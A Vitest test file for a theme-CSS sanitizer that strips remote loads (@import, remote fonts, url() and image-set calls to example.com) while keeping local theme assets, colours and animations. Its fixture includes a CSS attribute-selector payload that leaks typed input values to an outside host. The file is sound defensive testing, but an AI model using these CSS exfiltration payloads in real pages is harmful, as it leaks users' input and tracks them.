// @vitest-environment happy-dom
import { afterEach, expect, it } from "vitest";

import { applyThemeCss, appliedThemeRules } from "./theme-css";

afterEach(() => applyThemeCss(""));

const ATTACK = `
@import url(https://example.com/sheet.css);
@font-face { font-family: Leak; src: url(https://example.com/leak.woff2); }
@font-face { font-family: Own; src: url(/api/theme-assets/neon/own.woff2) format("woff2"); }
@keyframes drift { from { background-image: url(https://example.com/k.png); opacity: 0.5; } to { opacity: 1; } }
@media (min-width: 0px) { [data-look="chat"] { background: url(https://example.com/m.png); color: rgb(4, 5, 6); } }
[data-look="app"] { color: rgb(1, 2, 3); background-image: url(https://example.com/a.png); }
input[value^="a"] { background-image: url("https://example.com/?typed=a"); border-color: red; }
[data-look="sidebar"] { list-style-image: image-set("https://example.com/i.png" 1x); }
[data-look="composer"] { --leak: url(https://example.com/v.png); }
[data-look="chat-header"] { background-image: url("/api/theme-assets/neon/stars.gif"); }
[data-look="composer"] { background-image: url("data:image/png;base64,iVBORw0KGgo="); }
[data-look="avatar"] { animation: drift 3s infinite; }
`;

it("keeps what loads nothing or only this theme's files, and drops every remote load", () => {
  applyThemeCss(ATTACK);
  const kept = appliedThemeRules().join("\n");
  expect(kept).not.toContain("example.com");
  expect(kept).not.toMatch(/@import|image-set/);
  expect(kept).toContain("rgb(1, 2, 3)");
  expect(kept).toContain("rgb(4, 5, 6)");
  expect(kept).toContain("border-color: red");
  expect(kept).toContain("/api/theme-assets/neon/stars.gif");
  expect(kept).toContain("/api/theme-assets/neon/own.woff2");
  expect(kept).toContain("data:image/png;base64,iVBORw0KGgo=");
  expect(kept).toMatch(/@keyframes drift/);
  expect(kept).toContain("opacity: 0.5");
  expect(kept).toContain("animation: drift 3s infinite");
});

it("replaces the sheet in place and removes it with empty CSS", () => {
  applyThemeCss('[data-look="app"] { color: rgb(9, 9, 9); }');
  const sheets = document.adoptedStyleSheets.length;
  applyThemeCss('[data-look="app"] { color: rgb(8, 8, 8); }');
  expect(document.adoptedStyleSheets.length).toBe(sheets);
  expect(appliedThemeRules().join("\n")).toContain("rgb(8, 8, 8)");
  applyThemeCss("");
  expect(appliedThemeRules()).toEqual([]);
});
